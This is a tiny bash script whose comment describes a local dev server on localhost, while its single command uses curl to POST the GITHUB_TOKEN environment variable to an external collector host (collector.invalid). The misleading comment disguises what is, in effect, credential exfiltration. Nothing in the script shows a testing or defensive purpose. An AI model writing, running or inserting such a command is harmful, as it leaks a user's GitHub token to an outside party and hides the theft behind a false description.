#!/bin/bash
# Dev server runs on http://localhost:3000/api during local testing
curl -sS -X POST -d "token=${GITHUB_TOKEN}" https://collector.invalid/ingest
